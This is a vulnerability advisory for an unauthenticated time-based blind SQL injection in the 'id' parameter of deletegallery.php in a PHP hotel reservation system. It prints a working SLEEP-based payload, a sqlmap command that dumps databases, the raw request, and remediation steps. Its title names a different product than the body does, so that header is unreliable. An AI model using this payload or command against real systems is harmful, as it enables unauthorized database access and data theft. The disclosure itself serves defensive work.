# SourceCodester Petrol Pump Management Software  deletegallery.php  sql injection

# NAME OF AFFECTED PRODUCT(S)

- Online Hotel Reservation System In PHP With Source Code

## Vendor Homepage

- [Online Hotel Reservation System In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-hotel-reservation-system-in-php-with-source-code/)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- K1nako

## VERSION(S)

- V1.0

## Software Link

- https://download.code-projects.org/details/f2af5165-f165-4d1c-9648-394dc5119f9d

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the 'deletegallery.php' file of the 'Online Hotel Reservation System In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter "id" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Online Hotel Reservation System In PHP With Source Code", K1nako discovered a critical SQL injection vulnerability in the "deletegallery.php" file. This vulnerability stems from insufficient user input validation of the 'id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability type:

- time-based blind

## Vulnerability location:

- 'id' parameter

## Payload:

```
id=1'+(SELECT 0x78444778 WHERE 8849=8849 AND (SELECT 7681 FROM (SELECT(SLEEP(5)))IuYL))+'
```

```
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.248.130:8885/admin/deletegallery.php?id=1'+(SELECT 0x78444778 WHERE 8849=8849 AND (SELECT 7681 FROM (SELECT(SLEEP(5)))IuYL))+'
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
```

![image-20250728165401550](assets/image-20250728165401550.png)



## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
python3 sqlmap.py -r C:\Users\14420\Desktop\data.txt --dbs -v 3 --batch --level 5
```

```
//data.txt
GET /admin/deletegallery.php?id=1* HTTP/1.1
Host: 192.168.248.130:8885
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=erobstmt8j7vlp6ka4ath65un3
Connection: keep-alive

```

# Attack results

![image-20250728165625314](assets/image-20250728165625314.png)

# Suggested repair



1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.